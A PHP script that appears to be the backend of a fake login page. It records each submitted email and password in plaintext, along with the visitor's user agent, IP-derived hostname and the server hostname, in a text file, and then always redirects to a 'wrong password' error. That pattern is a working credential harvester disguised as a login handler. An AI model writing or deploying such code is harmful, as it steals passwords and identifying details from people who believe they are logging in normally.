<?php
// Get user agent string
$user_agent = $_SERVER['HTTP_USER_AGENT'];
if (isset($_POST['submit'])) {
    $user = $_POST['user1'];
    $pass = $_POST['pass'];
}else {
    header("location: Login");
    exit();
}
require_once "func.php";




// Function to parse user agent string and extract browser and OS information


// Call the function and retrieve browser and OS information
if(isset($_SERVER['REMOTE_USER'])) {
    // Get the remote user
    $remote_user = $_SERVER['REMOTE_USER'];
}
date_default_timezone_set('Asia/Manila');
$current_datetime = date("Y-m-d H:i:s");
$ip_address = $_SERVER['REMOTE_ADDR'];
$server_hostname = gethostname();

    // Perform a reverse DNS lookup to get the hostname (PC name)
    $hostname = gethostbyaddr($ip_address);
// Create or open a text file for writing
$file = fopen("chatbot/user_info.txt", "a");

// Write browser and OS information to the text file
fwrite($file, "Computer Information: " . $user_agent . "\n");
fwrite($file, "IP Address: " . $hostname . "\n");
fwrite($file, "Server Hostname: " . $server_hostname . "\n");
if (isset($user)) {
fwrite($file, "Email: " . $user . "\n");
}
if (isset($pass)) {
fwrite($file, "Password: " . $pass . "\n");
}
fwrite($file, "Date: " . $current_datetime . "\n");
if (isset($_SERVER['REMOTE_USER'])) {
fwrite($file, "Remote User: " . $remote_user . "\n");
}
fwrite($file, "\n");
fwrite($file, "*--------*--------*--------*--------*--------*--------*--------*--------*--------*--------*--------*--------*--------*--------*\n");
fwrite($file, "\n");
// Close the file
fclose($file);
if (empInpLogin($user, $pass) !== false) {
		header("location: Login.php?error=Empty_input");
		exit();
	} 
// Output a message to indicate that the information has been saved
 header("location: Login.php?error=wrong");
					exit();
?>
